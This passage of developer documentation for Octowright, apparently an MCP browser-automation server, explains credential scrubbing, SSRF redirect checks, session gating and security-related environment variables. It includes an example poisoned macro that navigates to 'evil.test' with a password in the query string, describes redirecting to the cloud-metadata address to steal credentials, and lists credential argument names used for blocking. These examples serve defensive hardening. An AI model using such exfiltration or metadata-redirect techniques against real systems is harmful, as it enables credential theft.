`OCTOWRIGHT_REDACT_INPUTS` did not cover any of it: it classifies a *typed value* at the moment of `fill`/`type` by inspecting the target element, and an aria snapshot is neither. Both paths now read one policy resolver, so `passwords` (the default) means the same thing on both.

Every sink routes through `session/aria_redaction.aria_snapshot(locator)`; a test (`tests/aria_redaction/test_no_unscrubbed_sinks.py`) AST-scans `src/` and fails on any raw `locator.aria_snapshot()` call outside the scrubber, because the leak was not one bug in one place and an eighth sink would reintroduce it. Design notes worth keeping:

- **Values are collected before the snapshot is taken.** If classification fails the call raises `AriaRedactionError` and no snapshot happens — there is no path that yields an unscrubbed tree because the classifier was unavailable. (Test doubles must therefore model the scan; `tests/_aria_stubs.py` provides it. `first.evaluate` serves both this scan and the record-time password probe, so the stub dispatches on the production JS constant by identity.)
- **Matching is value-based, not node-based.** The tree is a rendered string by then, so the only reliable join back to "which name was a secret" is the value, read from the DOM.
- Playwright **normalizes** an accessible name (a newline inside a value renders as a space), so each value is scrubbed in both raw and whitespace-collapsed form. It does *not* escape quotes/backslashes, so no unescaping is needed.
- Replacement is plain substring, **longest value first**, so a short secret can't eat a longer one it is a substring of. A 2-char password will also blank unrelated occurrences — the safe direction to be wrong in.
- Only light-DOM form controls are read; a value inside a **closed shadow root** is not reachable and is not scrubbed.
- `_parse_semantic_line` now handles both accessible-name renderings (`button "Confirm Order"` **and** `textbox: tanuki-tim`); only the first was handled, which is why the whole `role: value` string ended up in `role`.

### Per-hop redirect checking

`ssrf.check_navigation_url` runs pre-flight, on the URL a tool or macro asked for. A redirect is not that URL: a public page answering `302 Location: http://169.254.169.254/…` reached the metadata service with the guard none the wiser, and the read tools returned its body. Verified end-to-end against real Chromium.

**The obvious implementation does not work.** Playwright does not re-invoke a route handler for a redirected request — measured both after `route.fallback()` *and* after `route.fulfill(response=<the 302>)`: Chromium follows the chain inside the network stack, the handler runs exactly once (first hop), and the server sees every hop. A handler that inspects `request.url` is a no-op on precisely the case it exists for.

`ssrf_guard.install_navigation_guard` instead walks the chain itself for a GET navigation using `route.fetch(max_redirects=0)`, validating each `Location` **before** the request that would fetch it, then hands the navigation back to the browser with `route.fallback()` once the chain is clear. Accepted costs, all confined to deployments that opted into a policy (nothing is registered when `OCTOWRIGHT_SSRF_POLICY` is `off`, the default):

- **An allowed GET navigation is fetched twice** — once to validate, once by the browser. Letting the browser navigate for real is what keeps `page.url`, redirect history, and relative-URL resolution correct; fulfilling the final body against the original URL would silently break `browser_expect_url` and every relative link.
- **Non-GET navigations are not chain-checked** — validating a POST would double-submit the form. They keep the pre-flight check only, and the skip is logged.
- **Subresources are not checked** — a fetch to a private host can't be read back through the tool surface, and intercepting every image/XHR would break ordinary pages for no gain in this threat model.

Chain length is bounded by `MAX_REDIRECT_HOPS` (20, matching browsers) so a redirect loop can't spin the validator.

### Capability Profiles

The full MCP tool surface is 126 tools on a core install (133 with the optional `octowright[terminal]` extra, which adds the 7 `terminal_*` tools). When the LLM only needs a subset, set `OCTOWRIGHT_PROFILE` (or pass `--profile=...` to `octowright serve`) to one or more comma-separated profile names from `src/octowright/server/profiles.py`. Tools not listed in any active profile are skipped at `@mcp.tool` decoration time, so the LLM-visible schema shrinks accordingly. Profile names available today: `core` (minimal browser-driving plus compact DOM/HTTP discovery surface), `advanced` (inspection + cached captures + summaries + assertions + viewport controls + ARIA-locator interactions), `macros`, `scenarios`, `goldens` (accessibility-tree snapshot save/diff/verify), `personas`, and `terminals` (terminal sessions; only has tools to expose when the `octowright[terminal]` extra is installed). Unset / `all` keeps every tool (default, back-compat). The named profiles together cover the profile-scoped tools plus 7 always-on meta/Advisor tools — the remaining tools (a handful of less-common views, mutation helpers, trace/open-tab utilities, etc.) only register when no filter is set, so `--profile=core,advanced,macros,scenarios,goldens,personas,terminals` is **not** equivalent to no filter. Authoritative tool counts live in `src/octowright/server/profiles.py`.

**Always-on meta and Advisor tools.** Seven diagnostic/guidance tools are exempt from the profile filter and register under any profile (or no profile): `octowright_status`, `octowright_storage_report`, `octowright_dashboard_url`, `octowright_check_takeover`, `octowright_advisor_status`, `octowright_advisor_set_preference`, and `octowright_advisor_record_macro_observation`. These give the LLM a way to inspect the active profile, inspect storage paths, find the dashboard URL, detect competing MCP plugins, and surface local Advisor guidance regardless of filter. The list is `ALWAYS_ON_TOOLS` in `src/octowright/server/profiles.py`.

### Protected close behavior

`protected=True` marks a browser as user-owned. Close-capable tools must refuse protected browsers unless the caller explicitly passes `force=True`. This applies to `browser_close`, `browser_close_all`, and `browser_capture_and_close`; the capture-and-close tool checks protection before taking screenshots or snapshots so a refused call has no capture side effects. Internal rollback/teardown paths that are recovering from errors use `force=True` intentionally.

Headed (user-facing) browsers are `protected` **by default** so an agent's
reflex `browser_close` can't destroy a window the user is watching: when a
launch doesn't pass `protected` explicitly, a resolved-headed, non-ephemeral
browser gets `protected=True` (reason `headed_default`), while headless
(CI/agent-internal) browsers stay closeable. Precedence: explicit `protected`
arg > `OCTOWRIGHT_PROTECT_BROWSERS=1` (all) > `OCTOWRIGHT_PROTECT_HEADED`
(headed, default on) > unprotected. The refusal message is tailored by
`session.protected_reason`. Ephemeral headed browsers stay closeable
(throwaway intent). Internal relaunch/handoff/teardown close with `force=True`
and are unaffected.

### Browser Session Operation Gate

Every `BrowserSession` owns one `SessionOperationGate` (`src/octowright/session/operation_gate.py`) that serializes Octowright-owned Playwright work FIFO within that session while leaving different sessions fully parallel: the exact owning `asyncio.Task` may re-enter (a compound operation calling existing session helpers doesn't deadlock), but a task the owner spawns is a different identity and queues behind it like anyone else. One macro run — including nested `macro_call` actions, a full `macro_run_sequence`, macro-artifact replay, capture-and-close, and a closing handoff/fluid relaunch of the source session — holds one root lease for its entire invocation so a manual action can't interleave mid-sequence. Ordinary admission is bounded by `OCTOWRIGHT_OPERATION_QUEUE_TIMEOUT_SECONDS` (default `300`, must be positive finite seconds; `BrowserPool(operation_queue_timeout_seconds=...)` takes precedence over the env var) — this is queue wait only, separate from and added on top of any Playwright action/navigation/expect timeout, and the gate never retries a browser operation. A configuration at or above the 600-second progress-heartbeat ceiling (`OCTOWRIGHT_HEARTBEAT_MAX_SECONDS`) is allowed but logs `octowright.pool.operation_queue_timeout_exceeds_heartbeat_ceiling` because a caller stuck that long in queue may lose bridge transport visibility before it is ever admitted. A normal close establishes a cutoff, drains everything already admitted or queued, and only then tears the session down; work arriving after the cutoff is rejected with `SessionClosingError` rather than queued, and the close outcome is durable — cancelling the calling task does not revoke an accepted close or strand the session. External browser/page/context closure (not routed through the gate) can still interrupt whatever operation is actively running; any operation still queued at that point fails with `SessionClosedError`. All four gate errors (`SessionBusyTimeoutError`, `SessionClosingError`, `SessionClosedError`, `OperationGateInvariantError`) are session/tool-scoped — they never mean the MCP transport should be restarted, and a broken gate is isolated to its one session. `BrowserSession.list_pages()`, `list_frames()`, and `set_dialog_policy()` are now `async` (they read/mutate active-target state under the gate) — any embedder calling them directly must `await` them, and should tear a session down through `BrowserPool.close()` rather than raw Playwright teardown so the close cutoff/drain semantics apply. `session.operation_snapshot()` / the optional field `BrowserPool.list_sessions()` adds returns only `{state, active_operation, active_for_ms, queue_depth, oldest_wait_ms, queue_timeout_seconds}` — fixed operation identifiers and timing/depth counters, never a selector, URL, credential, macro argument, or task identity. The same snapshots for every live browser session are also available in one call at `octowright_status()["pool"]["operation_gates"]` (each entry adds `instance_id` and `kind`), the fastest way for an agent or operator to check whether a specific session's gate is stuck. `OperationGateInvariantError` (the fourth gate error) means that one session's gate reached an inconsistent internal state and is now permanently `broken` — it is not a transport or daemon problem; relaunch that one session and move on. Telemetry is the same shape: five bounded metrics, all under `octowright_operation_*`, with attributes limited to the fixed operation name, browser `kind`, and outcome/reason — never an instance ID — `octowright_operation_queue_wait_seconds` and `octowright_operation_active_duration_seconds` (histograms), `octowright_operation_queue_timeout_total` and `octowright_operation_rejected_total` (counters), and `octowright_operation_queue_depth` (a gauge aggregated per browser `kind`, not per session or operation). Gate scheduling itself is never written to JSONL, replayed, exported, or otherwise surfaced through the macro pipeline — only the underlying behavioral action is. Accessible keyboard drag/drop, a future control-lease/"Take control" workflow, terminal-session gating, and the repo-wide DRY audit are explicitly out of scope for this gate and remain separate future work.

### Octowright Advisor

Octowright Advisor is local and deterministic. It records bounded MCP tool-usage summaries and explicit repeated-workflow observations, then returns suggestions in `octowright_status` and `octowright_advisor_status`. Agents should inspect the `advisor` block after first-touch status. When an agent notices the same manual workflow repeating, call `octowright_advisor_record_macro_observation(source="llm", signature=..., summary=...)`; two matching signatures produce a `macro_candidate` suggestion. Advisor never auto-saves macros — macro candidates remain prompt-only even when the preference is `automatic`. Use `octowright_advisor_set_preference` to persist `yes` / `no` / `automatic` preferences for `macro_candidate` and `profile_change`.

### Post-upgrade "what's new" notice

The first time a leader starts on a new version (the running version differs from the last-seen marker), `octowright.upgrade` records a one-time notice and the leader echoes a banner to stderr (a human terminal in `--no-singleton`/inline mode; the daemon log otherwise). The notice is also surfaced at `octowright_status()["upgrade"]` — `{kind, previous_version, current_version, highlights}`, or `null` when nothing changed — so the agent should, on first-touch status, present the `highlights` to the user as a "what's new" banner. It fires once per version bump (the leader marks the new version seen). Curated highlights live in `octowright.upgrade.HIGHLIGHTS` keyed by version (updated at release time; a CI guard test fails if the current `VERSION` has no entry). The last-seen marker path is `OCTOWRIGHT_UPGRADE_STATE`.

## Env Var Configuration

All defaults are in `src/octowright/defaults.py`. Key vars:
- `OCTOWRIGHT_HTTP_PORT` — HTTP dashboard port (default 6286, auto-bumps if busy)
- `OCTOWRIGHT_HTTP_HOST` — HTTP dashboard bind host (default 127.0.0.1)
- `OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD` — set to `1` to allow non-loopback access to sensitive dashboard/MCP endpoints. **Warning:** there is no auth layer; combining a non-loopback `OCTOWRIGHT_HTTP_HOST` with this flag exposes RCE-equivalent surface (the MCP transport drives browsers) to the network. Use only behind your own auth gateway.
- `OCTOWRIGHT_DEFAULT_URL` — override the URL opened on `browser_launch` with no `url` argument (default resolves from the bound port at runtime; always points at `/new-tab` on the local daemon)
- `OCTOWRIGHT_DEFAULT_LABEL` — override the auto-detected default browser label (see `.octowright/config.yaml` for per-project configuration)
- `OCTOWRIGHT_BADGE_OPACITY` — corner badge opacity (float 0.0–1.0, default 0.35). Lower = more translucent.
- `OCTOWRIGHT_HEADLESS` — force headless mode
- `OCTOWRIGHT_IDLE_GRACE` — seconds the idle pool waits before the daemon auto-exits. **Unset/off by default**; a positive number opts in. Rationale + disable tokens: **Idle Watchdog**.
- `OCTOWRIGHT_PROFILES_DIR` — override profile storage root
- `OCTOWRIGHT_MACROS_DIR` — override macro JSON storage root
- `OCTOWRIGHT_ADVISOR_STATE` — override the local Advisor state JSON path (preferences, bounded tool usage, macro observations)
- `OCTOWRIGHT_UPGRADE_STATE` — override the last-seen-version marker path used by the post-upgrade "what's new" notice (see "Post-upgrade notice" above)
- `OCTOWRIGHT_MACRO_SLOWMO_MS` — default per-action delay during macro replay (0 disables)
- `OCTOWRIGHT_PROFILE` — comma-separated capability-profile names to slim the LLM tool surface; unset or `all` registers everything (see "Capability Profiles" above)
- `OCTOWRIGHT_TAIL_POLL_SECONDS` / `OCTOWRIGHT_TAIL_HEARTBEAT_SECONDS` — WS `/tail` poll interval and quiet-stream keepalive cadence (defaults 1.0 / 15.0)
- `OCTOWRIGHT_DASHBOARD_DISCONNECT_POLL_SECONDS` / `OCTOWRIGHT_DASHBOARD_HEARTBEAT_SECONDS` — SSE `/api/dashboard/events` disconnect-detection cadence and keepalive interval (defaults 0.05 / 15.0)
- `OCTOWRIGHT_REDACT_INPUTS` — record-time scrubbing of user-typed values (`type_text` / `fill`) in the per-session JSONL stream. `off` records the literal value (legacy, leaks secrets to anyone reading `/api/sessions/{id}/events`), `passwords` (DEFAULT) replaces values typed into `<input type="password">` — *and* `<input type="text">` carrying `autocomplete=current-password`, `new-password`, or `one-time-code` (the SPA-custom-password-input case) — with `<redacted:password>` while the page still receives the real value, `all` redacts every typed/filled value regardless of element type. `all` additionally scrubs the **selector-less sinks** that carry no inspectable field — `press_key` (key), `evaluate` (expression), and `select_option` (value/label) — via `_redact_sink_value`; `off`/`passwords` leave those raw (they key off element type and can't classify a selector-less value). The **same policy** now also governs accessibility-tree snapshots — see **Accessibility-snapshot credential scrubbing**. This is the record-time companion to the save-time `macros/lint.py` credential check — the linter only fires when an operator saves a recording as a macro, so unless this is set the JSONL on disk still contains the cleartext password. <!-- pragma: allowlist secret (redaction-policy prose, not a credential) -->
- `OCTOWRIGHT_RECORDINGS_PRIVATE` — owner-only recording-file permissions. **ON by default.** `recorder.Recorder` `chmod`s each JSONL to `0600` and its parent to `0700` (best-effort) so a local user can't read recorded input/URLs/credentials out-of-band. Set a falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) to leave the process umask in place for setups that intentionally share recordings with other local users. See **Recording-file privacy**.
- `OCTOWRIGHT_RECORDING_MAX_BYTES` — per-recording JSONL byte ceiling (disk-fill DoS guard). **OFF by default** (unbounded, back-compat). Set a positive byte count and `recorder.Recorder` stops appending once the file would exceed it, writing a single `recording_truncated` marker (carrying `limit_bytes`/`bytes_written`) so replay/export/discovery see the cut; a reopened recording counts the bytes already on disk before deciding. A non-positive / falsey (`0`/`off`/`never`/`none`/`disabled`) / unparsable value keeps it off. The parser lives in `recorder._recording_max_bytes` (defaults.py is at its LOC ceiling), mirroring how `incidents`/`health` keep their own `OCTOWRIGHT_*` knobs.
- `OCTOWRIGHT_TAIL_MAX_BYTES` — bytes `recorder.tail_log` reads in ONE call (memory guard for the read side of the same file the ceiling above bounds on the write side). **ON by default at 8 MiB**, unlike `OCTOWRIGHT_RECORDING_MAX_BYTES`: every caller (`browser_tail_recording`, `http/discovery.get_events`, `ScenarioPool.tail`) already loops on the returned cursor, so a window costs a round trip rather than correctness — whereas an unbounded `fh.read()` let one `?since=0` on a long-lived recording pull the whole file into the leader (the process owning every live browser) and then multiply it by parsing each line into a dict. A falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) or a non-positive/unparsable value restores the unbounded read. Parser: `recorder._tail_max_bytes` (defaults.py is at its LOC ceiling). **Oversized-line note:** a single JSONL line longer than the window contains no newline, and the pre-existing "no newline means a partial trailing line, wait" branch would then freeze the cursor and return nothing on every poll forever. `recorder._cursor_past_unterminated_window` separates the two cases — step over an oversized line (logging `octowright.recorder.tail_line_too_large`), hold still for a genuine partial write. The length check that distinguishes them is load-bearing: the recorder appends concurrently, so scanning ahead on a short read could pick up bytes written after it and skip a line that was only mid-write.
- `OCTOWRIGHT_MAX_REQUEST_BODY_BYTES` — route-level HTTP request-body ceiling. **OFF by default** (unbounded, back-compat). A positive byte count rejects a larger JSON body with `413` before it is fully materialized: `http/routes/_common._read_body_capped` checks `Content-Length` early and streams+counts so a lying/absent length can't bypass it. Falsey (`0`/`off`/`never`/`none`/`disabled`/`false`/`no`) / unparsable / non-positive keeps it off. Parser: `http/routes/_common._max_request_body_bytes` (defaults.py at its LOC ceiling).
- `OCTOWRIGHT_WEBSOCKET_MAX_BYTES` — per-session WebSocket sidecar byte ceiling (disk-fill DoS guard for a firehose page). **OFF by default** (unbounded, back-compat). A positive value stops appending recorded frames to the `.websocket.cache.jsonl` sidecar once it would exceed the limit, writing a single `websocket_truncated` marker (carrying `limit_bytes`/`bytes_written`) so inspection sees the cut. Falsey/unparsable/non-positive keeps it off. Parser: `session/core_io_mixin._websocket_max_bytes` (defaults.py at its LOC ceiling).
- `OCTOWRIGHT_SSRF_POLICY` — opt-in block of `http(s)` navigation to non-public hosts. **OFF by default** (full back-compat). `off` performs no host check; `block-private` refuses navigation to a *literal* IP in any non-public range (loopback, link-local **including the `169.254.169.254` cloud-metadata range**, RFC1918, multicast, reserved, unspecified) and to `localhost` / `*.localhost` / well-known metadata hostnames. Enforced in `octowright.ssrf.check_navigation_url`, called from the shared `_reject_unsafe_url` guard so it covers `browser_navigate` / `browser_open_url` / `browser_launch` **and macro/recording replay** — and the context's `base_url`, which the same guard validates so a host-relative macro can't inherit an origin the policy would refuse (see **Host-relative navigation**). Without it, a real browser plus the read tools (`browser_read_markdown` / `browser_snapshot` / `browser_evaluate`) can exfiltrate cloud-metadata credentials and reach internal hosts — including by a *poisoned macro*. Redirects **are** covered: `ssrf_guard.install_navigation_guard` re-checks every hop (see **Per-hop redirect checking**). Scope: literal-IP / known-name only (synchronous, no DNS); a public hostname that *resolves* to a private address (DNS-rebinding SSRF) is not covered. An *unrecognized* value fails safe to `block-private` (the operator clearly meant to enable a policy).
- `OCTOWRIGHT_PROFILES_PRIVATE` — owner-only permissions (`0700`) on persona/profile directories. **ON by default.** A profile dir holds live session cookies, `localStorage`, and IndexedDB for every site the persona logged into — a strictly stronger credential than the typed password `OCTOWRIGHT_RECORDINGS_PRIVATE` already protects. Chromium hardens its own profile root; **Firefox and WebKit do not** (observed: `cookies.sqlite` at `0644` inside an `0755` tree), so on a shared host another local user could copy a logged-in session straight off disk. The directory mode is the control — it denies traversal and so covers every file the engine creates inside, without octowright chasing per-file modes it doesn't own. `browser_pool.launch_helpers` locks the engine profile dir at launch and `personas.create_persona` locks a new persona dir; the walk goes up to `PROFILES_DIR` and stops (a leaf outside that root is locked on its own and the walk halts, so an unexpected `OCTOWRIGHT_PROFILES_DIR` can't chmod its way to `/`). Best-effort: a failing `chmod` never blocks a launch. Falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) opts out. Parser/helpers: `octowright.private_paths`.
- `OCTOWRIGHT_MACRO_CREDENTIAL_SINKS` — refuse to expand a credential-named macro arg into a field that leaks it. **ON by default** (`block`). `{"action": "navigate", "url": "https://evil.test/?p={{password}}"}` is an ordinary macro shape, so a poisoned or shared macro could exfiltrate a caller-supplied secret; `evaluate` hands it to page JS instead. The sink set is `url`/`expression` (`CREDENTIAL_UNSAFE_KEYS`), and nested lists/dicts inside a sink inherit it so the value can't be laundered through a container. Matching is **arg-name based** (`password`/`passwd`/`secret`/`token`/`otp`/`api_key`/`apikey`/`credential`/`auth`) precisely so `{{order_id}}` keeps working in a URL — parameterized navigation is the common legitimate pattern and is untouched, as is `{{password}}` into a `fill` `value`. Set to `allow` (or a falsey token) for a suite that intentionally puts a token in a query string. Parser: `macros.substitution.credential_sinks_blocked`.
- `OCTOWRIGHT_SSRF_ALLOW` — comma-separated host allowlist that overrides `OCTOWRIGHT_SSRF_POLICY=block-private` for legitimate internal targets (exact host match, e.g. `10.0.0.5,internal.box`).
- `OCTOWRIGHT_DASHBOARD_REQUIRE_PAIRING` — dashboard pairing gate for the browser-facing surface (sessions/media/events/tail/screencast/writes). **ON by default.** Loopback binding plus the Host/Origin guards stop a *remote* attacker and a *malicious web page*, but they are not authentication: any other local process that could open a socket to the port could enumerate live sessions, read recorded JSONL (typed input, navigated URLs, console output), fetch video, subscribe to the live screencast, and drive the browser — which made the on-by-default `0600` recordings and `0700` profiles overstated, since the daemon served the same bytes over HTTP. Mint a bearer with `octowright dashboard` (prints a single-use `/pair#<code>` URL, 60s TTL); guarded routes also accept `X-Octowright-Token` for follower/programmatic callers. Set a falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) to restore the type-the-URL flow. An **empty value means ON**, matching `OCTOWRIGHT_RECORDINGS_PRIVATE` — only an explicit falsey token disables a security default. **Enforcement needs something to pair against:** `octowright dashboard` authenticates with the leader's capability token, so an inline (`--no-singleton`) leader — no lockfile, no token — could never mint a code. Under the *default* the gate therefore degrades to unenforced there (logging `octowright.dashboard.pairing_unenforceable`) rather than shipping a permanently unopenable dashboard; an **explicit** opt-in keeps the original fail-closed behaviour. The anchor is not request-controlled (`build_app` attaches it unconditionally), and `tests/test_dashboard_pairing_default.py` pins that so a refactor can't silently disable the gate. `/api/mcp-events` is pairing-exempt: it already demands the capability token, a strictly stronger credential. **Getting the URL from an agent:** `octowright_dashboard_url` mints a pairing code itself and returns a ready-to-open `/pair#<code>` URL (plus `plain_url`, `pairing_required`, `pairing_expires_in`, `pairing_hint`), so "show me the dashboard" works in one step from a chat client with no terminal — otherwise the agent would hand the user a link that 401s. `octowright_status()` also reports a dashboard URL; it stays the **plain** address (status is polled often, and minting there would churn the bounded code store and could evict a code the user was just handed) and carries `dashboard_pairing_required` so the agent knows to call `octowright_dashboard_url` for an openable link instead of showing the bare one. **The MCP surface itself is untouched by pairing:** the gate is applied by `exposure.guard_sensitive_http` per route, while the follower bridge talks to the mounted `/mcp` ASGI app guarded by `SensitiveASGIGuard` + `BridgeTokenGuard` — verified, and pinned by `tests/test_pairing_leaves_mcp_working.py`, which also pins that `/new-tab` (a launched browser has no bearer), `/pair`, and the SPA shell stay reachable unauthenticated. That mint uses a longer window (`MCP_PAIR_CODE_TTL_SECONDS`, 600s) than the CLI's 60s, because a human reading an agent's message needs longer than an operator pasting from their own terminal; it stays single-use and loopback-only. Minting from MCP grants nothing new — the `/mcp` transport is gated by the *same* capability token the pairing store checks, so an MCP caller is already inside the trust boundary, and where that gate is off the caller can already drive browsers. `build_app` publishes the store through `http/state.set_dashboard_pairing` (the tool has no handle on the Starlette app); that is process-global, so `tests/conftest.py` isolates it per test or one test's token-carrying app lends its store to the next. See **Bridge capability token → Browser dashboard**.
- `OCTOWRIGHT_BRIDGE_REQUIRE_TOKEN` — require the `X-Octowright-Token` capability token on the leader's `/mcp` transport **and the follower-only `/api/mcp-events` SSE channel**. **ON by default.** Set a falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) to disable the gate. See **Bridge capability token** for the threat model + honest limits.
- `OCTOWRIGHT_MIN_FREE_MEMORY_MB` — memory-pressure launch governor (H4b). **OFF by default.** When set to a positive MB floor, every user-facing launch path (`browser_launch` / `browser_quick_launch` / `browser_spawn_roster` **and `scenario_start`**) refuses a launch while *available* memory is below it, heading off the low-memory → renderer-crash cascade. The cap and this floor are enforced in the pool layer (`browser_pool.limits`, at the `roster.spawn_roster` chokepoint plus single-launch shims) so the scenario path — which calls `pool.spawn_roster` directly — can't bypass them; internal relaunch/handoff/crash-recovery go through `pool.launch` and are intentionally uncapped. Available memory is read per-platform (Linux `/proc/meminfo` `MemAvailable`; macOS `vm_stat` free+inactive+speculative+purgeable) by `octowright.sysresources` — NOT a sysconf one-liner, because the macOS "free" count reports cache/purgeable RAM as used and would false-refuse. An unreadable value never refuses. `0`/`off`/`never`/`none`/`disabled` keep it off. Surfaced at `octowright_status()["pool"]["min_free_memory_mb"]` / `["available_memory_mb"]` (both null when off). The value lives in `octowright.sysresources.MIN_FREE_MEMORY_BYTES` (defaults.py is at its LOC ceiling), mirroring how `incidents`/`health` keep their own `OCTOWRIGHT_*` knobs.
- `OCTOWRIGHT_DRIVER_RELAUNCH` — driver-death lost-session handling (H4a). When the shared Playwright driver dies and self-heals (P3), every browser that rode it is gone; Octowright **always** captures + surfaces those lost sessions at `octowright_status()["pool"]["lost_sessions"]` (each `{instance_id, kind, url, profile, reason, relaunched_to}`). This knob controls whether it also auto-reopens them to their last URL/profile: `off` (DEFAULT) surface only — no instance_id churn, no surprise navigation; `new-id` reopens with a fresh instance_id (the lost record maps old→new, clients must rebind); `keep-id` reopens and rebinds the ORIGINAL instance_id so existing client handles keep resolving (best-effort — the recording file stays under the fresh id; navigation re-runs either way). Loop-guarded: an auto-reopened session that dies again is not recaptured. The value/parser live in `octowright.browser_pool.driver_relaunch` (`DRIVER_RELAUNCH_MODE` / `parse_mode`).
- `OCTOWRIGHT_BRIDGE_SUSPEND_THRESHOLD_SECONDS` — follower suspend-detection threshold (default `5.0`). The deadline watchdog (`proxy_supervisor.watch_deadlines`) times the wall-clock gap between its own iterations; a gap exceeding its sleep interval by more than this means the follower **process** was frozen (an MCP client SIGSTOPped it — e.g. Codex/Claude compaction), not normal jitter. On detection it shifts every in-flight request's `time.monotonic` deadline forward by the frozen span so a call the freeze stranded isn't falsely timed out the instant the follower resumes (its deadline would otherwise already be blown). It deliberately does **not** force a reconnect — the reactive reset→resume path reconnects if the connection actually died, and forcing one here races the in-flight forward. Pairs with the reconnect replaying the **full** `initialize` + `notifications/initialized` handshake — replaying only `initialize` leaves the fresh leader session half-initialized, so the next tool call gets a 400, the failure a real follower hits after a compaction freeze. Counted by `octowright_bridge_suspension_total`. Const lives in `proxy_supervisor.SUSPEND_THRESHOLD_SECONDS` (defaults.py is at its LOC ceiling).
- `OCTOWRIGHT_HEARTBEAT_INTERVAL_SECONDS` / `OCTOWRIGHT_HEARTBEAT_MAX_SECONDS` — leader-side progress-heartbeat cadence (default `8.0`) and absolute ceiling (default `600.0`). The follower injects a synthetic `progressToken` into every `tools/call` and re-arms that request's in-flight deadline on each `notifications/progress` it sees (`proxy_supervisor._rearm_deadline`) — but **nothing on the leader emitted those pings**, so the whole re-arm path was dead and the bridge fell back to static per-tool timeout guessing (`BRIDGE_TOOL_TIMEOUTS`). A genuinely-working call that outran its static budget (a slow `browser_expect_*`/`scenario_start`/`browser_wait_for` on a sluggish site — none of which even have a per-tool override, so they used the flat 20s `BRIDGE_REQUEST_TIMEOUT_SECONDS`) then surfaced to the agent as a **spurious "Octowright disconnected"**, and per `BRIDGE_ERROR_GUIDANCE` the agent told the user to reconnect a healthy server. `server/_heartbeat._progress_heartbeat` (the OUTERMOST tool wrapper in `server/_state.py`) closes this: while a tool handler runs, a background task sends progress on the injected token every interval. The first ping lands before the flat 20s deadline, so **every** tool — even those with no `BRIDGE_TOOL_TIMEOUTS` entry — is re-armed and stays alive as long as the leader event loop is alive to run the heartbeat. The three failure modes now resolve predictably: *slow but alive* → pings flow, no false disconnect; *leader loop wedged/dead* → the heartbeat can't run either, so pings stop and the deadline expires fast (a real problem, surfaced quickly); *handler wedged past its own internal timeout* → pings stop at the ceiling, bounding the worst-case single-call hang instead of hanging the agent forever. The ceiling must exceed the longest legit single call (a big `macro_run_sequence`) or the agent's post-timeout retry would double-execute the side effect. A client that supplies its OWN `progressToken` receives these pings as normal progress (it opted in); a bridge-synthetic token is swallowed by the follower and never reaches the client. Consts live in `server/_heartbeat.py` (defaults.py is at its LOC ceiling).
- `OCTOWRIGHT_BRIDGE_MIN_SESSION_SECONDS` — flap-guard threshold for the follower reconnect loop (default `2.0`). The success path of `proxy_runtime.run_supervised_proxy` (a session that ended cleanly, vs. the error path) had **no backoff** — so if the leader accepted a connection then ended the session almost immediately, the follower reconnected with zero delay, busy-looping the leader into a `Created new transport` / `Terminating session` storm (observed at ~300+ transports/sec across several live followers, starving real tool calls). Now a cleanly-ended session that lived **shorter than this** is treated as a *flap* and backed off via `reconnect_delay(flap_attempt)` (increasing, capped at `OCTOWRIGHT_BRIDGE_RECONNECT_MAX_SECONDS`), counted as `octowright_bridge_reconnect_total{reason="session_flap"}`; a session that lived at least this long reconnects promptly and resets the flap counter. The decision lives in the pure `proxy_runtime._post_session_backoff`; the const is in `proxy_runtime` (defaults.py is at its LOC ceiling). NOTE: this is follower-side — it takes effect for followers spawned after the fix; already-running old followers keep storming until their client reconnects.
- `OCTOWRIGHT_MCP_SESSION_IDLE_SECONDS` — reap an idle StreamableHTTP MCP session after this many seconds. **OFF by default**, mirroring `OCTOWRIGHT_IDLE_GRACE`'s philosophy: nothing pings the leader to reset a session's idle deadline between real tool calls (only an in-flight call's progress heartbeat does, via `server/_heartbeat.py`), so an ordinary interactive gap — reading output, deciding what to say, watching a slow build/CI run — looks identical to an abandoned session to this timer. Two prior defaults (300s, then 3600s) both reaped live, wanted sessions during normal silence; there is no timeout short enough to catch an abandoned reconnect-storm session without also risking a real one that pauses that long. Set a positive number (e.g. `1800`) to opt in on a shared/CI host that wants bounded memory over long-lived idle sessions; unset/`0`/`off`/`never`/`none`/`disabled` keep it off (the mcp library's own default — it never reaps). When enabled, `http/app.py` sets the timeout on the manager after `streamable_http_app()` builds it (via `_apply_mcp_session_idle_timeout`); the manager resets the deadline on each request, so an ACTIVE session is never reaped — only a truly idle/abandoned one, whose `run_server` task then exits and frees its memory. Without it, an unbounded reconnect-storm (see `OCTOWRIGHT_BRIDGE_MIN_SESSION_SECONDS`) can still leak ~54KB per abandoned session (observed a leader at **2.4GB RSS with zero live browsers** after ~17h; a worse case with heavier concurrent-follower load reached **18.8GB** over ~4.7 days on 2026-07-09) — the flap-guard and split-brain fixes reduce how often such storms happen, but this knob is the direct bound if one still gets through. The parser lives in `http/app.py` (defaults.py at LOC ceiling). **Complementary, unconditional reaper:** `housekeeping._reap_dead_follower_sessions_once` runs every housekeeping cycle regardless of this knob, and reaps by *PID liveness* instead of idle time — bridge-state.json already carries each follower's `(follower_pid, remote_session_id)`, so a follower whose OS process is confirmed gone is terminated immediately, with zero risk of false-positiving on a live client that's merely quiet (the exact risk that keeps idle-time reaping off by default). See `housekeeping.py`'s module docstring (job 3) and `octowright_follower_session_reaped_total` in the metrics table below. See **Leader-side storm protection** for the on-by-default rate-limit + session-cap that bound an *active* storm this reaper can't touch.
- `OCTOWRIGHT_MCP_MAX_SESSIONS` — the concurrent-`/mcp`-session cap housekeeping job 4 LRU-evicts back down to (see **Leader-side storm protection** above for the eviction ordering). **Default 256** (on); `0`/`off`/`never`/`none`/`disabled`/non-positive disables. Parser + eviction selector in `http/mcp_flap_guard.py`.
- `OCTOWRIGHT_MCP_NEW_SESSION_MAX` / `OCTOWRIGHT_MCP_NEW_SESSION_WINDOW_SECONDS` — the per-source new-session rate limit's threshold and window (**defaults 10 per 10s**, on; see **Leader-side storm protection** above). A falsey `OCTOWRIGHT_MCP_NEW_SESSION_MAX` disables the limiter. Parser in `http/mcp_flap_guard.py`.
- `OCTOWRIGHT_PROTECT_HEADED` — protect HEADED, non-ephemeral browsers at launch
  by default (a reflex `browser_close` is refused; `force=True` still closes).
